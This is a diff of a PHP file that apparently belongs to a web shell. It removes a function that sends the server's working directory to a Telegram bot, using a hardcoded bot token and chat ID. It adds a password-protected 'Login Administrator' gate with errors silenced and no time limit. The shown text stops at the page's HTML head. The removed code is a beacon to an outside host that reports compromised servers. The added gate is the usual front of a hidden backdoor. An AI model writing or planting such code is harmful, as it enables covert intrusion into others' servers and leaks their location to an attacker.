@@ -1,38 +1,36 @@
 <?php
-function sendMessageToTelegram($message) {
-    $botToken = '8062137472:AAGpUrlivbLctbhC0lL7J0cr7qXhAL71EKE';
-    $chatId = '7371703370';
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+$password = 'a91592db5b4aa85280133cba76ce616b';
+error_reporting(0);
+set_time_limit(0);
 
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
-
-    // Menggunakan cURL untuk mengirim pesan
-    $options = [
-        CURLOPT_URL => $url,
-        CURLOPT_POST => true,
-        CURLOPT_POSTFIELDS => $data,
-        CURLOPT_RETURNTRANSFER => true
-    ];
-
-    $ch = curl_init();
-    curl_setopt_array($ch, $options);
-    $result = curl_exec($ch);
-    curl_close($ch);
-
-    return $result;
+session_start();
+if (!isset($_SESSION['loggedIn'])) {
+    $_SESSION['loggedIn'] = false;
 }
 
+if (isset($_POST['password'])) {
+    if (md5($_POST['password']) == $password) {
+        $_SESSION['loggedIn'] = true;
+    }
+} 
 
-// Mendapatkan lokasi direktori saat ini
-$currentDir = getcwd(); // Atau bisa gunakan "/path/to/your/directory"
-$message = "Folder saat ini: <b>$currentDir</b>";
-sendMessageToTelegram($message);
+if (!$_SESSION['loggedIn']): ?>
+
+<html><head><title>Login Administrator</title></head>
+  <body bgcolor="black">
+    <center>
+    <p align="center"><center><font style="font-size:13px" color="red" face="text-dark">
+    <form method="post">
+      <input type="password" name="password">
+      <input type="submit" name="submit" value="  Login"><br>
+    </form>
+  </body>
+</html>
+
+<?php
+exit();
+endif;
 ?>
-
 <!DOCTYPE html>
 <html>
 <head>
